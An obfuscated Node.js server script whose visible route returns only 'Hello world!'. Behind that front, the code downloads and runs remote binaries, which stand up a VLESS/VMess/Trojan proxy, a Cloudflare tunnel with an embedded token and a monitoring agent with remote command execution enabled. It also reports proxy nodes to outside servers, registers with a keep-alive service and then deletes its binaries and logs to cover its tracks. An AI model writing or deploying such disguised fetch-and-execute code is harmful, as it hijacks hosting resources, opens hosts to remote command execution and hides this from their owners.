const _0x303001=_0x17ca;(function(_0x409f88,_0x21f0db){const _0x1e3239=_0x17ca,_0x1e3b26=_0x409f88();while(!![]){try{const _0x29e524=-parseInt(_0x1e3239(0x180))/0x1+parseInt(_0x1e3239(0x1dd))/0x2+-parseInt(_0x1e3239(0x1bd))/0x3+-parseInt(_0x1e3239(0x1ca))/0x4*(-parseInt(_0x1e3239(0x175))/0x5)+parseInt(_0x1e3239(0x1af))/0x6*(parseInt(_0x1e3239(0x195))/0x7)+-parseInt(_0x1e3239(0x1de))/0x8+-parseInt(_0x1e3239(0x17e))/0x9*(-parseInt(_0x1e3239(0x1e3))/0xa);if(_0x29e524===_0x21f0db)break;else _0x1e3b26['push'](_0x1e3b26['shift']());}catch(_0x3ce738){_0x1e3b26['push'](_0x1e3b26['shift']());}}}(_0x5e58,0xe3611));const express=require('express'),app=express(),axios=require(_0x303001(0x1d9)),os=require('os'),fs=require('fs'),path=require('path'),{promisify}=require(_0x303001(0x1ab)),exec=promisify(require('child_process')[_0x303001(0x1fb)]),{execSync}=require(_0x303001(0x1c7)),UPLOAD_URL=process[_0x303001(0x16f)]['UPLOAD_URL']||'',PROJECT_URL=process[_0x303001(0x16f)]['PROJECT_URL']||'',AUTO_ACCESS=process[_0x303001(0x16f)][_0x303001(0x152)]||![],FILE_PATH=process['env'][_0x303001(0x1fc)]||'./tmp',SUB_PATH=process[_0x303001(0x16f)][_0x303001(0x187)]||'sub',PORT=process['env'][_0x303001(0x1a0)]||process[_0x303001(0x16f)][_0x303001(0x14e)]||0xbb8,UUID=process[_0x303001(0x16f)][_0x303001(0x178)]||_0x303001(0x159),NEZHA_SERVER=process[_0x303001(0x16f)][_0x303001(0x151)]||'',NEZHA_PORT=process[_0x303001(0x16f)][_0x303001(0x17c)]||'',NEZHA_KEY=process[_0x303001(0x16f)][_0x303001(0x150)]||'',ARGO_DOMAIN=process[_0x303001(0x16f)]['ARGO_DOMAIN']||_0x303001(0x1bb),ARGO_AUTH=process[_0x303001(0x16f)]['ARGO_AUTH']||_0x303001(0x194),ARGO_PORT=process[_0x303001(0x16f)][_0x303001(0x169)]||0x1f41,CFIP=process[_0x303001(0x16f)][_0x303001(0x164)]||'www.visa.com.sg',CFPORT=process[_0x303001(0x16f)]['CFPORT']||0x1bb,NAME=process[_0x303001(0x16f)][_0x303001(0x1c0)]||'Vls';!fs[_0x303001(0x17f)](FILE_PATH)?(fs['mkdirSync'](FILE_PATH),console[_0x303001(0x1db)](FILE_PATH+_0x303001(0x174))):console['log'](FILE_PATH+_0x303001(0x1a5));let npmPath=path[_0x303001(0x19f)](FILE_PATH,_0x303001(0x1d7)),phpPath=path[_0x303001(0x19f)](FILE_PATH,_0x303001(0x1b0)),webPath=path[_0x303001(0x19f)](FILE_PATH,_0x303001(0x190)),botPath=path[_0x303001(0x19f)](FILE_PATH,_0x303001(0x1b7)),subPath=path[_0x303001(0x19f)](FILE_PATH,_0x303001(0x172)),listPath=path[_0x303001(0x19f)](FILE_PATH,'list.txt'),bootLogPath=path[_0x303001(0x19f)](FILE_PATH,_0x303001(0x1d8)),configPath=path[_0x303001(0x19f)](FILE_PATH,'config.json');function deleteNodes(){const _0x29e204=_0x303001;try{if(!UPLOAD_URL)return;if(!fs['existsSync'](subPath))return;let _0x16c893;try{_0x16c893=fs[_0x29e204(0x1ea)](subPath,_0x29e204(0x199));}catch{return null;}const _0x229859=Buffer[_0x29e204(0x1a7)](_0x16c893,_0x29e204(0x1ac))[_0x29e204(0x1bf)]('utf-8'),_0x32bf84=_0x229859[_0x29e204(0x1e5)]('\x0a')[_0x29e204(0x1b1)](_0x318ea8=>/(vless|vmess|trojan|hysteria2|tuic):\/\//[_0x29e204(0x179)](_0x318ea8));if(_0x32bf84[_0x29e204(0x1ce)]===0x0)return;return axios[_0x29e204(0x1a8)](UPLOAD_URL+_0x29e204(0x189),JSON[_0x29e204(0x16b)]({'nodes':_0x32bf84}),{'headers':{'Content-Type':_0x29e204(0x160)}})['catch'](_0x4cddef=>{return null;});}catch(_0x43e1f0){return null;}}function _0x17ca(_0x50599d,_0xff9e66){const _0x5e584a=_0x5e58();return _0x17ca=function(_0x17ca1d,_0x3dc4a5){_0x17ca1d=_0x17ca1d-0x14c;let _0x4b0352=_0x5e584a[_0x17ca1d];return _0x4b0352;},_0x17ca(_0x50599d,_0xff9e66);}function cleanupOldFiles(){const _0x484b6c=_0x303001,_0xf8bf39=[_0x484b6c(0x190),_0x484b6c(0x1b7),'npm','php','sub.txt',_0x484b6c(0x1d8)];_0xf8bf39['forEach'](_0x166ea4=>{const _0x8e1efc=_0x484b6c,_0x2d0a6b=path[_0x8e1efc(0x19f)](FILE_PATH,_0x166ea4);fs[_0x8e1efc(0x193)](_0x2d0a6b,()=>{});});}app[_0x303001(0x1df)]('/',function(_0x53e7f6,_0x259d1f){const _0x3a91a3=_0x303001;_0x259d1f[_0x3a91a3(0x19c)](_0x3a91a3(0x184));});const config={'log':{'access':'/dev/null','error':_0x303001(0x1d4),'loglevel':_0x303001(0x158)},'inbounds':[{'port':ARGO_PORT,'protocol':_0x303001(0x154),'settings':{'clients':[{'id':UUID,'flow':_0x303001(0x1c2)}],'decryption':_0x303001(0x158),'fallbacks':[{'dest':0xbb9},{'path':'/vless-argo','dest':0xbba},{'path':_0x303001(0x1e8),'dest':0xbbb},{'path':'/trojan-argo','dest':0xbbc}]},'streamSettings':{'network':_0x303001(0x1ec)}},{'port':0xbb9,'listen':_0x303001(0x14f),'protocol':'vless','settings':{'clients':[{'id':UUID}],'decryption':_0x303001(0x158)},'streamSettings':{'network':'tcp','security':_0x303001(0x158)}},{'port':0xbba,'listen':_0x303001(0x14f),'protocol':_0x303001(0x154),'settings':{'clients':[{'id':UUID,'level':0x0}],'decryption':_0x303001(0x158)},'streamSettings':{'network':'ws','security':_0x303001(0x158),'wsSettings':{'path':_0x303001(0x1f1)}},'sniffing':{'enabled':!![],'destOverride':[_0x303001(0x1b6),_0x303001(0x19d),_0x303001(0x176)],'metadataOnly':![]}},{'port':0xbbb,'listen':_0x303001(0x14f),'protocol':_0x303001(0x1a2),'settings':{'clients':[{'id':UUID,'alterId':0x0}]},'streamSettings':{'network':'ws','wsSettings':{'path':_0x303001(0x1e8)}},'sniffing':{'enabled':!![],'destOverride':[_0x303001(0x1b6),_0x303001(0x19d),_0x303001(0x176)],'metadataOnly':![]}},{'port':0xbbc,'listen':_0x303001(0x14f),'protocol':_0x303001(0x1e0),'settings':{'clients':[{'password':UUID}]},'streamSettings':{'network':'ws','security':'none','wsSettings':{'path':_0x303001(0x153)}},'sniffing':{'enabled':!![],'destOverride':['http','tls','quic'],'metadataOnly':![]}}],'dns':{'servers':[_0x303001(0x196)]},'outbounds':[{'protocol':_0x303001(0x161),'tag':'direct'},{'protocol':_0x303001(0x1fa),'tag':_0x303001(0x198)}]};fs['writeFileSync'](path[_0x303001(0x19f)](FILE_PATH,_0x303001(0x186)),JSON['stringify'](config,null,0x2));function getSystemArchitecture(){const _0x373da5=_0x303001,_0x20668c=os[_0x373da5(0x1f2)]();return _0x20668c===_0x373da5(0x1b2)||_0x20668c==='arm64'||_0x20668c===_0x373da5(0x1a1)?_0x373da5(0x1b2):_0x373da5(0x1c1);}function downloadFile(_0x2bd0a6,_0x730b49,_0x3f0a83){const _0x41a5fe=_0x303001,_0x366d6c=path['join'](FILE_PATH,_0x2bd0a6),_0x219517=fs['createWriteStream'](_0x366d6c);axios({'method':_0x41a5fe(0x1df),'url':_0x730b49,'responseType':'stream'})[_0x41a5fe(0x1c6)](_0x14fcc6=>{const _0x313e6a=_0x41a5fe;_0x14fcc6[_0x313e6a(0x1f0)][_0x313e6a(0x157)](_0x219517),_0x219517['on']('finish',()=>{const _0x9a97bc=_0x313e6a;_0x219517[_0x9a97bc(0x1c3)](),console[_0x9a97bc(0x1db)](_0x9a97bc(0x1d0)+_0x2bd0a6+'\x20successfully'),_0x3f0a83(null,_0x2bd0a6);}),_0x219517['on']('error',_0x15c4cf=>{const _0x2e5587=_0x313e6a;fs[_0x2e5587(0x193)](_0x366d6c,()=>{});const _0xadd61d='Download\x20'+_0x2bd0a6+_0x2e5587(0x16d)+_0x15c4cf[_0x2e5587(0x1f3)];console[_0x2e5587(0x166)](_0xadd61d),_0x3f0a83(_0xadd61d);});})['catch'](_0x40ac42=>{const _0x50588f=_0x41a5fe,_0x5304f3=_0x50588f(0x1d0)+_0x2bd0a6+_0x50588f(0x16d)+_0x40ac42[_0x50588f(0x1f3)];console[_0x50588f(0x166)](_0x5304f3),_0x3f0a83(_0x5304f3);});}async function downloadFilesAndRun(){const _0x14b9c6=_0x303001,_0xdbc317=getSystemArchitecture(),_0x1c2c54=getFilesForArchitecture(_0xdbc317);if(_0x1c2c54['length']===0x0){console[_0x14b9c6(0x1db)](_0x14b9c6(0x1c9));return;}const _0x320c5c=_0x1c2c54[_0x14b9c6(0x1cd)](_0x217dae=>{return new Promise((_0x5b5c77,_0x4ef3b1)=>{const _0x275506=_0x17ca;downloadFile(_0x217dae[_0x275506(0x15c)],_0x217dae[_0x275506(0x1dc)],(_0x2ce962,_0x43eb96)=>{_0x2ce962?_0x4ef3b1(_0x2ce962):_0x5b5c77(_0x43eb96);});});});try{await Promise[_0x14b9c6(0x191)](_0x320c5c);}catch(_0x4a89de){console[_0x14b9c6(0x166)]('Error\x20downloading\x20files:',_0x4a89de);return;}function _0x507333(_0x2dd3e0){const _0x12d072=0x1fd;_0x2dd3e0['forEach'](_0x369700=>{const _0x1a43b6=_0x17ca,_0x2b73f2=path[_0x1a43b6(0x19f)](FILE_PATH,_0x369700);fs[_0x1a43b6(0x17f)](_0x2b73f2)&&fs['chmod'](_0x2b73f2,_0x12d072,_0x23d5f8=>{const _0x3873ac=_0x1a43b6;_0x23d5f8?console[_0x3873ac(0x166)](_0x3873ac(0x1f9)+_0x2b73f2+':\x20'+_0x23d5f8):console[_0x3873ac(0x1db)](_0x3873ac(0x18a)+_0x2b73f2+':\x20'+_0x12d072['toString'](0x8));});});}const _0x79f30b=NEZHA_PORT?[_0x14b9c6(0x14d),'./web','./bot']:[_0x14b9c6(0x168),_0x14b9c6(0x15e),'./bot'];_0x507333(_0x79f30b);if(NEZHA_SERVER&&NEZHA_KEY){if(!NEZHA_PORT){const _0x18d84a=NEZHA_SERVER[_0x14b9c6(0x182)](':')?NEZHA_SERVER[_0x14b9c6(0x1e5)](':')[_0x14b9c6(0x156)]():'',_0x22441e=new Set([_0x14b9c6(0x16e),'8443','2096','2087','2083',_0x14b9c6(0x197)]),_0x5085fb=_0x22441e[_0x14b9c6(0x1ef)](_0x18d84a)?'true':_0x14b9c6(0x1cb),_0x72429c='\x0aclient_secret:\x20'+NEZHA_KEY+_0x14b9c6(0x163)+NEZHA_SERVER+'\x0askip_connection_count:\x20false\x0askip_procs_count:\x20false\x0atemperature:\x20false\x0atls:\x20'+_0x5085fb+_0x14b9c6(0x1f7)+UUID;fs[_0x14b9c6(0x18e)](path[_0x14b9c6(0x19f)](FILE_PATH,_0x14b9c6(0x17d)),_0x72429c);const _0x435652='nohup\x20'+FILE_PATH+_0x14b9c6(0x1aa)+FILE_PATH+'/config.yaml\x22\x20>/dev/null\x202>&1\x20&';try{await exec(_0x435652),console[_0x14b9c6(0x1db)]('php\x20is\x20running'),await new Promise(_0x446793=>setTimeout(_0x446793,0x3e8));}catch(_0x5b3d3d){console[_0x14b9c6(0x166)](_0x14b9c6(0x167)+_0x5b3d3d);}}else{let _0x478bb1='';const _0x2a476d=[_0x14b9c6(0x16e),_0x14b9c6(0x1b3),_0x14b9c6(0x1c5),_0x14b9c6(0x15d),_0x14b9c6(0x1eb),_0x14b9c6(0x197)];_0x2a476d[_0x14b9c6(0x182)](NEZHA_PORT)&&(_0x478bb1=_0x14b9c6(0x1e9));const _0x30d24b='nohup\x20'+FILE_PATH+_0x14b9c6(0x1be)+NEZHA_SERVER+':'+NEZHA_PORT+_0x14b9c6(0x15a)+NEZHA_KEY+'\x20'+_0x478bb1+_0x14b9c6(0x1f5);try{await exec(_0x30d24b),console[_0x14b9c6(0x1db)]('npm\x20is\x20running'),await new Promise(_0x5f2a04=>setTimeout(_0x5f2a04,0x3e8));}catch(_0x424323){console[_0x14b9c6(0x166)]('npm\x20running\x20error:\x20'+_0x424323);}}}else console['log'](_0x14b9c6(0x165));const _0x57c93c=_0x14b9c6(0x15b)+FILE_PATH+_0x14b9c6(0x1d2)+FILE_PATH+'/config.json\x20>/dev/null\x202>&1\x20&';try{await exec(_0x57c93c),console[_0x14b9c6(0x1db)](_0x14b9c6(0x171)),await new Promise(_0x250f3b=>setTimeout(_0x250f3b,0x3e8));}catch(_0x28eeb9){console[_0x14b9c6(0x166)](_0x14b9c6(0x1ba)+_0x28eeb9);}if(fs[_0x14b9c6(0x17f)](path[_0x14b9c6(0x19f)](FILE_PATH,_0x14b9c6(0x1b7)))){let _0x31bad8;if(ARGO_AUTH[_0x14b9c6(0x1f8)](/^[A-Z0-9a-z=]{120,250}$/))_0x31bad8=_0x14b9c6(0x1b8)+ARGO_AUTH;else ARGO_AUTH['match'](/TunnelSecret/)?_0x31bad8=_0x14b9c6(0x1b9)+FILE_PATH+_0x14b9c6(0x1ae):_0x31bad8=_0x14b9c6(0x18c)+FILE_PATH+_0x14b9c6(0x1e6)+ARGO_PORT;try{await exec(_0x14b9c6(0x15b)+FILE_PATH+'/bot\x20'+_0x31bad8+_0x14b9c6(0x1f5)),console[_0x14b9c6(0x1db)](_0x14b9c6(0x183)),await new Promise(_0x222da1=>setTimeout(_0x222da1,0x7d0));}catch(_0x2f05c0){console[_0x14b9c6(0x166)]('Error\x20executing\x20command:\x20'+_0x2f05c0);}}await new Promise(_0x2f01fa=>setTimeout(_0x2f01fa,0x1388));}function getFilesForArchitecture(_0xb78de1){const _0x193ac3=_0x303001;let _0x216614;_0xb78de1===_0x193ac3(0x1b2)?_0x216614=[{'fileName':_0x193ac3(0x190),'fileUrl':'https://arm64.ssss.nyc.mn/web'},{'fileName':'bot','fileUrl':_0x193ac3(0x1e1)}]:_0x216614=[{'fileName':'web','fileUrl':'https://amd64.ssss.nyc.mn/web'},{'fileName':_0x193ac3(0x1b7),'fileUrl':_0x193ac3(0x1c8)}];if(NEZHA_SERVER&&NEZHA_KEY){if(NEZHA_PORT){const _0x1b2ba6=_0xb78de1===_0x193ac3(0x1b2)?'https://arm64.ssss.nyc.mn/agent':_0x193ac3(0x1c4);_0x216614[_0x193ac3(0x1a4)]({'fileName':_0x193ac3(0x1d7),'fileUrl':_0x1b2ba6});}else{const _0x4aeebe=_0xb78de1===_0x193ac3(0x1b2)?'https://arm64.ssss.nyc.mn/v1':'https://amd64.ssss.nyc.mn/v1';_0x216614[_0x193ac3(0x1a4)]({'fileName':_0x193ac3(0x1b0),'fileUrl':_0x4aeebe});}}return _0x216614;}function _0x5e58(){const _0x3ce552=['/sub.txt\x20saved\x20successfully','UUID','test','ARGO_DOMAIN:','ARGO_DOMAIN\x20or\x20ARGO_AUTH\x20variable\x20is\x20empty,\x20use\x20quick\x20tunnels','NEZHA_PORT','config.yaml','45UpSkQE','existsSync','421445rHrlrv','/api/add-subscriptions','includes','bot\x20is\x20running','Hello\x20world!','/vmess-argo?ed=2560','config.json','SUB_PATH','&path=%2Fvless-argo%3Fed%3D2560#','/api/delete-nodes','Empowerment\x20success\x20for\x20','https://keep.gvrander.eu.org/add-url','tunnel\x20--edge-ip-version\x20auto\x20--no-autoupdate\x20--protocol\x20http2\x20--logfile\x20','forEach','writeFileSync','\x20>/dev/null\x202>&1','web','all','Subscription\x20uploaded\x20successfully','unlink','eyJhIjoiODYyMmRlNmEyYTk3OGJjMjNmMzAxOTZlZWVlNTk4MzgiLCJ0IjoiYzZhMGFhNmItYTIwNC00YjhmLTgxMzItNGJkMThiYjlkNDI4IiwicyI6Ik5EazFNV1JqTjJRdFl6SXhNaTAwWXpVMUxUZ3lOMlV0T1RJMlptWmxabVl3T1RNMyJ9','10066lUnRQc','https+local://8.8.8.8/dns-query','2053','block','utf-8','response','\x0a\x20\x20tunnel:\x20','send','tls','tunnel.json','join','SERVER_PORT','aarch64','vmess','listen','unshift','\x20already\x20exists','curl\x20-s\x20https://speed.cloudflare.com/meta\x20|\x20awk\x20-F\x5c\x22\x20\x27{print\x20$26\x22-\x22$18}\x27\x20|\x20sed\x20-e\x20\x27s/\x20/_/g\x27','from','post','ArgoDomain\x20not\x20found,\x20re-running\x20bot\x20to\x20obtain\x20ArgoDomain','/php\x20-c\x20\x22','util','base64','trim','/tunnel.yml\x20run','4908YbTIvo','php','filter','arm','8443','&type=ws&host=','text/plain;\x20charset=utf-8','http','bot','tunnel\x20--edge-ip-version\x20auto\x20--no-autoupdate\x20--protocol\x20http2\x20run\x20--token\x20','tunnel\x20--edge-ip-version\x20auto\x20--config\x20','web\x20running\x20error:\x20','argo.njdaxue.ggff.net','?security=tls&sni=','4347825dJVpPC','/npm\x20-s\x20','toString','NAME','amd','xtls-rprx-vision','close','https://amd64.ssss.nyc.mn/agent','2096','then','child_process','https://amd64.ssss.nyc.mn/2go','Can\x27t\x20find\x20a\x20file\x20for\x20the\x20current\x20architecture','1620wjCbgH','false','tunnel.yml','map','length','Thank\x20you\x20for\x20using\x20this\x20script,\x20enjoy!','Download\x20','\x0a\x20\x20credentials-file:\x20','/web\x20-c\x20','ARGO_AUTH\x20mismatch\x20TunnelSecret,use\x20token\x20connect\x20to\x20tunnel','/dev/null','automatic\x20access\x20task\x20added\x20successfully','\x0a\x20\x20\x0atrojan://','npm','boot.log','axios','TunnelSecret','log','fileUrl','1673594YRhxOi','13065448qaBcSh','get','trojan','https://arm64.ssss.nyc.mn/2go','status','4261940nrKhaL','push','split','/boot.log\x20--loglevel\x20info\x20--url\x20http://localhost:','pkill\x20-f\x20\x22[b]ot\x22\x20>\x20/dev/null\x202>&1','/vmess-argo','--tls','readFileSync','2083','tcp','/api/add-nodes','Error\x20executing\x20command:\x20','has','data','/vless-argo','arch','message','App\x20is\x20running','\x20>/dev/null\x202>&1\x20&','\x0a\x20\x20\x0avmess://','\x0ause_gitee_to_upgrade:\x20false\x0ause_ipv6_country_code:\x20false\x0auuid:\x20','match','Empowerment\x20failed\x20for\x20','blackhole','exec','FILE_PATH','clear','./npm','PORT','127.0.0.1','NEZHA_KEY','NEZHA_SERVER','AUTO_ACCESS','/trojan-argo','vless','\x0a\x20\x20\x20\x20\x20\x20service:\x20http://localhost:','pop','pipe','none','9afd1229-b893-40c1-84dd-51e7ce204913','\x20-p\x20','nohup\x20','fileName','2087','./web','添加URL失败:\x20','application/json','freedom','&path=%2Ftrojan-argo%3Fed%3D2560#','\x0adebug:\x20false\x0adisable_auto_update:\x20true\x0adisable_command_execute:\x20false\x0adisable_force_update:\x20true\x0adisable_nat:\x20false\x0adisable_send_query:\x20false\x0agpu:\x20false\x0ainsecure_tls:\x20false\x0aip_report_period:\x201800\x0areport_delay:\x201\x0aserver:\x20','CFIP','NEZHA\x20variable\x20is\x20empty,skip\x20running','error','php\x20running\x20error:\x20','./php','ARGO_PORT','Content-Type','stringify','Error\x20reading\x20boot.log:','\x20failed:\x20','443','env','ArgoDomain:','web\x20is\x20running','sub.txt','http\x20server\x20is\x20running\x20on\x20port:','\x20is\x20created','3595jEAGgH','quic'];_0x5e58=function(){return _0x3ce552;};return _0x5e58();}function argoType(){const _0x4d1d6d=_0x303001;if(!ARGO_AUTH||!ARGO_DOMAIN){console[_0x4d1d6d(0x1db)](_0x4d1d6d(0x17b));return;}if(ARGO_AUTH['includes'](_0x4d1d6d(0x1da))){fs[_0x4d1d6d(0x18e)](path[_0x4d1d6d(0x19f)](FILE_PATH,_0x4d1d6d(0x19e)),ARGO_AUTH);const _0x560902=_0x4d1d6d(0x19b)+ARGO_AUTH[_0x4d1d6d(0x1e5)]('\x22')[0xb]+_0x4d1d6d(0x1d1)+path[_0x4d1d6d(0x19f)](FILE_PATH,'tunnel.json')+'\x0a\x20\x20protocol:\x20http2\x0a\x20\x20\x0a\x20\x20ingress:\x0a\x20\x20\x20\x20-\x20hostname:\x20'+ARGO_DOMAIN+_0x4d1d6d(0x155)+ARGO_PORT+'\x0a\x20\x20\x20\x20\x20\x20originRequest:\x0a\x20\x20\x20\x20\x20\x20\x20\x20noTLSVerify:\x20true\x0a\x20\x20\x20\x20-\x20service:\x20http_status:404\x0a\x20\x20';fs[_0x4d1d6d(0x18e)](path[_0x4d1d6d(0x19f)](FILE_PATH,_0x4d1d6d(0x1cc)),_0x560902);}else console['log'](_0x4d1d6d(0x1d3));}argoType();async function extractDomains(){const _0x171d53=_0x303001;let _0x27eb05;if(ARGO_AUTH&&ARGO_DOMAIN)_0x27eb05=ARGO_DOMAIN,console[_0x171d53(0x1db)](_0x171d53(0x17a),_0x27eb05),await _0x4c5e61(_0x27eb05);else try{const _0x494874=fs[_0x171d53(0x1ea)](path[_0x171d53(0x19f)](FILE_PATH,_0x171d53(0x1d8)),_0x171d53(0x199)),_0x4ade65=_0x494874[_0x171d53(0x1e5)]('\x0a'),_0x25ee28=[];_0x4ade65[_0x171d53(0x18d)](_0x1cc143=>{const _0x4710d4=_0x171d53,_0x2ea10d=_0x1cc143['match'](/https?:\/\/([^ ]*trycloudflare\.com)\/?/);if(_0x2ea10d){const _0x3c2c80=_0x2ea10d[0x1];_0x25ee28[_0x4710d4(0x1e4)](_0x3c2c80);}});if(_0x25ee28[_0x171d53(0x1ce)]>0x0)_0x27eb05=_0x25ee28[0x0],console[_0x171d53(0x1db)](_0x171d53(0x170),_0x27eb05),await _0x4c5e61(_0x27eb05);else{console['log'](_0x171d53(0x1a9)),fs['unlinkSync'](path[_0x171d53(0x19f)](FILE_PATH,_0x171d53(0x1d8)));async function _0x262915(){const _0x42bae6=_0x171d53;try{await exec(_0x42bae6(0x1e7));}catch(_0x327ff3){}}_0x262915(),await new Promise(_0x317645=>setTimeout(_0x317645,0xbb8));const _0x434e7d=_0x171d53(0x18c)+FILE_PATH+_0x171d53(0x1e6)+ARGO_PORT;try{await exec(_0x171d53(0x15b)+path[_0x171d53(0x19f)](FILE_PATH,_0x171d53(0x1b7))+'\x20'+_0x434e7d+_0x171d53(0x1f5)),console[_0x171d53(0x1db)]('bot\x20is\x20running.'),await new Promise(_0x390865=>setTimeout(_0x390865,0xbb8)),await extractDomains();}catch(_0x57701c){console['error'](_0x171d53(0x1ee)+_0x57701c);}}}catch(_0xcdc6d){console[_0x171d53(0x166)](_0x171d53(0x16c),_0xcdc6d);}async function _0x4c5e61(_0x5ac7d9){const _0xbb4d28=_0x171d53,_0x5bcf7c=execSync(_0xbb4d28(0x1a6),{'encoding':_0xbb4d28(0x199)}),_0x2c5169=_0x5bcf7c[_0xbb4d28(0x1ad)]();return new Promise(_0x4a0a2b=>{setTimeout(()=>{const _0xf2b51b=_0x17ca,_0x58dbf1={'v':'2','ps':NAME+'-'+_0x2c5169,'add':CFIP,'port':CFPORT,'id':UUID,'aid':'0','scy':'none','net':'ws','type':_0xf2b51b(0x158),'host':_0x5ac7d9,'path':_0xf2b51b(0x185),'tls':_0xf2b51b(0x19d),'sni':_0x5ac7d9,'alpn':''},_0x2354d7='\x0avless://'+UUID+'@'+CFIP+':'+CFPORT+'?encryption=none&security=tls&sni='+_0x5ac7d9+_0xf2b51b(0x1b4)+_0x5ac7d9+_0xf2b51b(0x188)+NAME+'-'+_0x2c5169+_0xf2b51b(0x1f6)+Buffer[_0xf2b51b(0x1a7)](JSON[_0xf2b51b(0x16b)](_0x58dbf1))[_0xf2b51b(0x1bf)](_0xf2b51b(0x1ac))+_0xf2b51b(0x1d6)+UUID+'@'+CFIP+':'+CFPORT+_0xf2b51b(0x1bc)+_0x5ac7d9+_0xf2b51b(0x1b4)+_0x5ac7d9+_0xf2b51b(0x162)+NAME+'-'+_0x2c5169+'\x0a\x20\x20\x20\x20';console[_0xf2b51b(0x1db)](Buffer['from'](_0x2354d7)['toString']('base64')),fs[_0xf2b51b(0x18e)](subPath,Buffer[_0xf2b51b(0x1a7)](_0x2354d7)[_0xf2b51b(0x1bf)](_0xf2b51b(0x1ac))),console['log'](FILE_PATH+_0xf2b51b(0x177)),uplodNodes(),app[_0xf2b51b(0x1df)]('/'+SUB_PATH,(_0x5a82dd,_0x3d81b4)=>{const _0x5ed4ac=_0xf2b51b,_0x2c6787=Buffer[_0x5ed4ac(0x1a7)](_0x2354d7)[_0x5ed4ac(0x1bf)](_0x5ed4ac(0x1ac));_0x3d81b4['set'](_0x5ed4ac(0x16a),_0x5ed4ac(0x1b5)),_0x3d81b4[_0x5ed4ac(0x19c)](_0x2c6787);}),_0x4a0a2b(_0x2354d7);},0x7d0);});}}async function uplodNodes(){const _0x1b5826=_0x303001;if(UPLOAD_URL&&PROJECT_URL){const _0x4cf479=PROJECT_URL+'/'+SUB_PATH,_0x2f9945={'subscription':[_0x4cf479]};try{const _0x859ff4=await axios['post'](UPLOAD_URL+_0x1b5826(0x181),_0x2f9945,{'headers':{'Content-Type':_0x1b5826(0x160)}});if(_0x859ff4[_0x1b5826(0x1e2)]===0xc8)console[_0x1b5826(0x1db)](_0x1b5826(0x192));else return null;}catch(_0x5d9954){if(_0x5d9954['response']){if(_0x5d9954[_0x1b5826(0x19a)][_0x1b5826(0x1e2)]===0x190){}}}}else{if(UPLOAD_URL){if(!fs[_0x1b5826(0x17f)](listPath))return;const _0x3bc8b1=fs[_0x1b5826(0x1ea)](listPath,_0x1b5826(0x199)),_0x5110fa=_0x3bc8b1[_0x1b5826(0x1e5)]('\x0a')[_0x1b5826(0x1b1)](_0x206fe3=>/(vless|vmess|trojan|hysteria2|tuic):\/\//['test'](_0x206fe3));if(_0x5110fa[_0x1b5826(0x1ce)]===0x0)return;const _0x6977d4=JSON['stringify']({'nodes':_0x5110fa});try{await axios[_0x1b5826(0x1a8)](UPLOAD_URL+_0x1b5826(0x1ed),_0x6977d4,{'headers':{'Content-Type':_0x1b5826(0x160)}});if(response[_0x1b5826(0x1e2)]===0xc8)console[_0x1b5826(0x1db)](_0x1b5826(0x192));else return null;}catch(_0x22ccee){return null;}}else return;}}function cleanFiles(){setTimeout(()=>{const _0x3a4568=_0x17ca,_0xdf00b9=[bootLogPath,configPath,webPath,botPath,phpPath,npmPath];if(NEZHA_PORT)_0xdf00b9[_0x3a4568(0x1e4)](npmPath);else NEZHA_SERVER&&NEZHA_KEY&&_0xdf00b9[_0x3a4568(0x1e4)](phpPath);exec('rm\x20-rf\x20'+_0xdf00b9[_0x3a4568(0x19f)]('\x20')+_0x3a4568(0x18f),_0x2af154=>{const _0x35726d=_0x3a4568;console[_0x35726d(0x14c)](),console[_0x35726d(0x1db)](_0x35726d(0x1f4)),console[_0x35726d(0x1db)](_0x35726d(0x1cf));});},0x15f90);}cleanFiles();async function AddVisitTask(){const _0x23520d=_0x303001;if(!AUTO_ACCESS||!PROJECT_URL){console[_0x23520d(0x1db)]('Skipping\x20adding\x20automatic\x20access\x20task');return;}try{const _0x2581bb=await axios['post'](_0x23520d(0x18b),{'url':PROJECT_URL},{'headers':{'Content-Type':_0x23520d(0x160)}});console[_0x23520d(0x1db)](_0x23520d(0x1d5));}catch(_0x1ce780){console[_0x23520d(0x166)](_0x23520d(0x15f)+_0x1ce780[_0x23520d(0x1f3)]);}}async function startserver(){deleteNodes(),cleanupOldFiles(),await downloadFilesAndRun(),await extractDomains(),AddVisitTask();}startserver(),app[_0x303001(0x1a3)](PORT,()=>console[_0x303001(0x1db)](_0x303001(0x173)+PORT+'!'));
